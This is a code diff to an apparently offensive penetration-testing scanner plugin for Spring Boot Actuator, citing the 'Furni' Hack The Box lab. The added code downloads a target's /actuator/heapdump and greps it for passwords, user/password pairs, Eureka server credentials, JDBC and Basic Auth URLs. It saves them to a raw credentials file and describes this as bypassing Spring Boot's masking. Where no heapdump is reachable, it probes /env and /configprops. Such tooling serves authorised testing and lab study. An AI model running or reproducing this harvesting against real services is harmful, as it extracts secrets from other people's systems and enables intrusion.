@@ -81,6 +81,19 @@ class SpringBootActuator(ServiceScan):
 		self.add_pattern(r'(?i)spring.datasource.username[:\s=]*([^\s,\n]+)', description='WARNING: Database Username exposed: {match1}')
 		self.add_pattern(r'(?i)spring.profiles.active[:\s=]*([^\s,\n]+)', description='Spring Active Profiles: {match1} - environment configuration')
 		
+		# Heapdump Credential Extraction Patterns (Furni HTB style) - Raw memory strings
+		self.add_pattern(r'password=([^&\s,\n}]+)', description='CRITICAL: Password credential found in heapdump: {match1}')
+		self.add_pattern(r'{password=([^&]+)&[^}]*user=([^}]+)}', description='CRITICAL: User/Password pair found: user={match2}, password={match1}')
+		self.add_pattern(r'EurekaSrvr:([^@]+)@([^:]+):(\d+)', description='CRITICAL: Eureka Server credentials found: password={match1} host={match2}:{match3}')
+		self.add_pattern(r'http://([^:]+):([^@]+)@([^:]+):8761', description='CRITICAL: Eureka HTTP Basic Auth: user={match1}, password={match2}, server={match3}:8761')
+		self.add_pattern(r'PWD=([^\s,\n]+)', description='INFO: PWD environment variable: {match1}')
+		
+		# Additional credential patterns for raw memory extraction
+		self.add_pattern(r'user=([^&\s,\n}]+)', description='INFO: Username found in memory: {match1}')
+		self.add_pattern(r'username=([^&\s,\n}]+)', description='INFO: Username found in memory: {match1}')
+		self.add_pattern(r'jdbc:[^:]+://([^:]+):([^@]+)@([^:/]+)', description='CRITICAL: JDBC credentials found: user={match1}, password={match2}, host={match3}')
+		self.add_pattern(r'://([^:]+):([^@]+)@([^:/]+):', description='CRITICAL: URL credentials found: user={match1}, password={match2}, host={match3}')
+		
 		# Cloud and Microservice Patterns
 		self.add_pattern(r'(?i)spring.cloud.config.server', description='Spring Cloud Config Server detected - centralized configuration management')
 		self.add_pattern(r'(?i)spring.cloud.gateway', description='Spring Cloud Gateway detected - API gateway service')
@@ -247,23 +260,80 @@ class SpringBootActuator(ServiceScan):
 						service.info(f"⚠️ Error checking heapdump: {e}")
 				
 				if heapdump_available:
-					# Download heapdump and search for credentials
-					service.info(f"📥 Downloading heapdump for credential extraction...")
+					# Download heapdump and search for credentials (BYPASSES Spring Boot property masking)
+					service.info(f"📥 Downloading heapdump for RAW credential extraction (bypasses ******)...")
+					heapdump_creds_file = f'{{scandir}}/CREDENTIALS_{{port}}_{hostname_label}.txt'
+					raw_creds_file = f'{{scandir}}/RAW_CREDENTIALS_{{port}}_{hostname_label}.txt'
 					await service.execute(
-						f'echo "=== Downloading heapdump ===" && '
+						f'echo "=== Downloading heapdump (bypasses Spring Boot masking) ===" && '
 						f'curl -s -m {timeout*6} {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump '
 						f'-o {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof && '
-						f'echo "=== Searching for passwords ===" && '
 						f'if [ -f {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof ]; then '
-						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -i "password=" | head -20; '
-						f'  echo "=== Searching for database URLs ===" && '
-						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -i "jdbc:" | head -10; '
-						f'  echo "=== Searching for API keys ===" && '
-						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -iE "(api.?key|secret|token)" | head -15; '
-						f'  echo "=== Searching for Eureka credentials ===" && '
-						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -iE "eureka.*@|@.*eureka" | head -10; '
+						f'  echo "🔍 Extracting RAW credentials from heapdump memory..." && '
+						f'  echo "=== RAW password= patterns (Furni HTB method) ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep "password=" | head -20; '
+						f'  echo "=== RAW user/password pairs ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -E "{{password=.*&.*user=|user=.*password=}}" | head -10; '
+						f'  echo "=== PWD environment variables ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep "PWD" | head -15; '
+						f'  echo "=== Eureka server credentials (EurekaSrvr pattern) ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -E "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10; '
+						f'  echo "=== Database connection strings ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep "jdbc:" | head -10; '
+						f'  echo "=== HTTP Basic Auth URLs ===" && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -E "://.*:.*@" | head -10; '
+						f'  echo "=== Creating RAW credentials file ===" && '
+						f'  echo "--- RAW CREDENTIALS EXTRACTED FROM HEAPDUMP ---" > {raw_creds_file} && '
+						f'  echo "Source: {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump" >> {raw_creds_file} && '
+						f'  echo "Method: Raw memory strings extraction (bypasses Spring Boot masking)" >> {raw_creds_file} && '
+						f'  echo "Timestamp: $(date)" >> {raw_creds_file} && '
+						f'  echo "" >> {raw_creds_file} && '
+						f'  echo "[FURNI HTB - PASSWORD= PATTERNS]" >> {raw_creds_file} && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep "password=" >> {raw_creds_file} && '
+						f'  echo "" >> {raw_creds_file} && '
+						f'  echo "[FURNI HTB - PWD ENVIRONMENT]" >> {raw_creds_file} && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep "PWD" >> {raw_creds_file} && '
+						f'  echo "" >> {raw_creds_file} && '
+						f'  echo "[EUREKA SERVER CREDENTIALS]" >> {raw_creds_file} && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -E "EurekaSrvr|://.*:.*@.*:8761" >> {raw_creds_file} && '
+						f'  echo "" >> {raw_creds_file} && '
+						f'  echo "[ALL HTTP BASIC AUTH URLS]" >> {raw_creds_file} && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep -E "://.*:.*@" >> {raw_creds_file} && '
+						f'  echo "" >> {raw_creds_file} && '
+						f'  echo "[DATABASE CONNECTIONS]" >> {raw_creds_file} && '
+						f'  strings {{scandir}}/heapdump_{{port}}_{hostname_label}.hprof | grep "jdbc:" >> {raw_creds_file} && '
+						f'  echo "✅ RAW credentials saved to: {raw_creds_file}" && '
+						f'  echo "⚠️  Check both files for complete results"; '
+						f'else '
+						f'  echo "❌ Heapdump download failed"; '
 						f'fi',
 						outfile=heapdump_outfile
+					)
+				else:
+					service.info("❌ Heapdump endpoint not accessible - trying alternative credential extraction...")
+					
+					# Alternative 1: Try raw environment endpoint 
+					service.info("🔄 Attempting raw /env endpoint access...")
+					env_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_env_raw_{hostname_label}.txt'
+					await service.execute(
+						f'echo "=== Trying raw /env endpoint ===" && '
+						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/env 2>&1 && '
+						f'echo "=== Trying /actuator/env ===" && '
+						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/actuator/env 2>&1 && '
+						f'echo "=== Trying with different headers ===" && '
+						f'curl -s -m {timeout} -H "Accept: text/plain" {{http_scheme}}://{hostname}:{{port}}/actuator/env 2>&1',
+						outfile=env_outfile
+					)
+					
+					# Alternative 2: Try configprops endpoint
+					service.info("🔄 Attempting configprops endpoint access...")
+					config_outfile = f'{{protocol}}_{{port}}_{{http_scheme}}_spring_boot_config_raw_{hostname_label}.txt'
+					await service.execute(
+						f'echo "=== Trying /actuator/configprops ===" && '
+						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/actuator/configprops 2>&1 && '
+						f'echo "=== Trying /configprops ===" && '
+						f'curl -s -m {timeout} {{http_scheme}}://{hostname}:{{port}}/configprops 2>&1',
+						outfile=config_outfile
 					)
 				
 				# Check for common Spring Boot error pages and info disclosure
@@ -334,11 +404,21 @@ class SpringBootActuator(ServiceScan):
 				f'  echo "";',
 				f'done',
 				f'',
-				f'# CRITICAL: Download and analyze heapdump for credentials',
+				f'# CRITICAL: Download and analyze heapdump for credentials (Furni HTB method)',
 				f'curl -s {{http_scheme}}://{hostname}:{{port}}/actuator/heapdump -o heapdump_{{port}}.hprof',
-				f'strings heapdump_{{port}}.hprof | grep -i "password=" | head -20',
+				f'# Search for password= patterns as seen in Furni HTB',
+				f'strings heapdump_{{port}}.hprof | grep "password=" | head -20',
+				f'# Search for PWD environment variables',
+				f'strings heapdump_{{port}}.hprof | grep "PWD" | head -15',
+				f'# Search for Eureka server credentials (EurekaSrvr pattern)',
+				f'strings heapdump_{{port}}.hprof | grep -iE "EurekaSrvr.*@|://.*:.*@.*:8761" | head -10',
+				f'# Search for user/password pairs',
+				f'strings heapdump_{{port}}.hprof | grep -iE "{{password=.*&.*user=|user=.*password=}}" | head -10',
+				f'# Search for HTTP Basic Auth URLs',
+				f'strings heapdump_{{port}}.hprof | grep -iE "://.*:.*@" | head -10',
+				f'# Search for database URLs',
 				f'strings heapdump_{{port}}.hprof | grep -i "jdbc:" | head -10',
-				f'strings heapdump_{{port}}.hprof | grep -iE "eureka.*@|@.*eureka" | head -10',
+				f'# Search for API keys and tokens',
 				f'strings heapdump_{{port}}.hprof | grep -iE "(api.?key|secret|token)" | head -15',
 				f'',
 				f'# Test common credentials',
